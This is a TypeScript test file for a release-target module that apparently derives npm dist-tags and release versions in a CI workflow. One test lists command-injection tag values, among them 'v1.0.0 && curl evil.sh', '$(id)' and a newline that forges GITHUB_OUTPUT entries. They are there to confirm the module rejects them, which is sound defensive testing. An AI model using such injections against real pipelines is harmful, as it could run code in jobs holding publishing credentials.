import { describe, expect, it } from 'bun:test';
import {
  distTagForVersion,
  ReleaseTargetError,
  resolveReleaseTarget,
  versionFromTag,
} from './release-target.ts';

describe('distTagForVersion', () => {
  it('keeps prereleases off the latest tag', () => {
    // The whole point of the dist-tag derivation: if a prerelease landed on
    // `latest`, every `npm install @maelstrom-co/react` would resolve to it.
    expect(distTagForVersion('0.1.0-alpha.0')).toBe('alpha');
    expect(distTagForVersion('1.2.3-beta.12')).toBe('beta');
    expect(distTagForVersion('2.0.0-rc.1')).toBe('rc');
  });

  it('publishes stable versions to latest', () => {
    expect(distTagForVersion('0.1.0')).toBe('latest');
    expect(distTagForVersion('10.20.30')).toBe('latest');
  });

  it('derives the preid from the prerelease segment alone', () => {
    // `-` starts the prerelease segment; anything after it is the preid.
    expect(distTagForVersion('1.0.0-next')).toBe('next');
  });

  it('ignores build metadata when deriving the tag', () => {
    // `+build` is not part of the prerelease. Reading it as one produced the
    // dist-tag `next+build`, which npm rejects — so a tag that SEMVER_PATTERN
    // accepted could still fail the release at the derivation step.
    expect(distTagForVersion('1.0.0-next+build.1')).toBe('next');
    expect(distTagForVersion('0.1.0-alpha.0+sha.abc123')).toBe('alpha');
  });

  it('does not mistake a dash inside build metadata for a prerelease', () => {
    // `1.0.0+build-1` is a stable version: the only `-` lives in build
    // metadata. Scanning for the first `-` across the whole string read `1` as
    // the preid and rejected the release instead of publishing to `latest`.
    expect(distTagForVersion('1.0.0+build-1')).toBe('latest');
  });

  it('rejects a version whose prerelease segment is empty', () => {
    expect(() => distTagForVersion('1.0.0-')).toThrow(ReleaseTargetError);
  });
});

describe('versionFromTag', () => {
  it('strips the v prefix that nx.json releaseTag.pattern adds', () => {
    expect(versionFromTag('v0.1.0')).toBe('0.1.0');
    expect(versionFromTag('v0.1.0-alpha.0')).toBe('0.1.0-alpha.0');
  });

  it('rejects tags that are not release tags', () => {
    // A stray tag must not be treated as a release: it would publish whatever
    // version happens to be in the manifests.
    for (const tag of ['notatag', 'v', '0.1.0', 'release-0.1.0']) {
      expect(() => versionFromTag(tag)).toThrow(ReleaseTargetError);
    }
  });

  it('rejects a tag carrying shell metacharacters', () => {
    // The version reaches a command line and GITHUB_OUTPUT. A tag was once
    // able to smuggle `;` through to a shell, executing arbitrary code in a
    // job that holds an npm-publishing OIDC identity.
    for (const tag of [
      'v1.0.0-alpha;echo pwned',
      'v1.0.0 && curl evil.sh',
      'v1.0.0`id`',
      'v1.0.0$(id)',
      'v1.0.0|tee',
    ]) {
      expect(() => versionFromTag(tag)).toThrow(ReleaseTargetError);
    }
  });

  it('rejects a multi-line tag that could forge extra step outputs', () => {
    // GITHUB_OUTPUT is newline-delimited `key=value`, so an embedded newline
    // would let a dispatch input declare outputs the workflow never set.
    expect(() => versionFromTag('v1.0.0\ndry_run=true')).toThrow(
      ReleaseTargetError,
    );
  });
});

describe('resolveReleaseTarget', () => {
  it('treats a tag push as a real release regardless of inputs', () => {
    // dry_run is a dispatch-only input; a pushed tag must never be a rehearsal,
    // or a release would silently publish nothing.
    const target = resolveReleaseTarget({
      eventName: 'push',
      refName: 'v1.0.0',
      inputDryRun: 'true',
    });
    expect(target).toEqual({
      version: '1.0.0',
      distTag: 'latest',
      dryRun: false,
    });
  });

  it('rehearses a branch when dispatched with no tag', () => {
    const target = resolveReleaseTarget({
      eventName: 'workflow_dispatch',
      refName: 'main',
      inputTag: '',
      inputDryRun: 'true',
    });
    expect(target.dryRun).toBe(true);
    // No version means downstream steps skip the manifest assertion, which
    // would otherwise fail against whatever the branch happens to carry.
    expect(target.version).toBe('');
  });

  it('refuses a real publish with no tag', () => {
    expect(() =>
      resolveReleaseTarget({
        eventName: 'workflow_dispatch',
        refName: 'main',
        inputTag: '',
        inputDryRun: 'false',
      }),
    ).toThrow(ReleaseTargetError);
  });

  it('ignores the branch ref when dispatched with an explicit tag', () => {
    // refName is the dispatch branch, not the tag — using it would publish
    // from the wrong tree.
    const target = resolveReleaseTarget({
      eventName: 'workflow_dispatch',
      refName: 'main',
      inputTag: 'v0.2.0-beta.1',
      inputDryRun: 'false',
    });
    expect(target.version).toBe('0.2.0-beta.1');
    expect(target.distTag).toBe('beta');
    expect(target.dryRun).toBe(false);
  });

  it('tolerates a tag input with surrounding whitespace', () => {
    const target = resolveReleaseTarget({
      eventName: 'workflow_dispatch',
      refName: 'main',
      inputTag: '  v1.0.0  ',
      inputDryRun: 'false',
    });
    expect(target.version).toBe('1.0.0');
  });
});
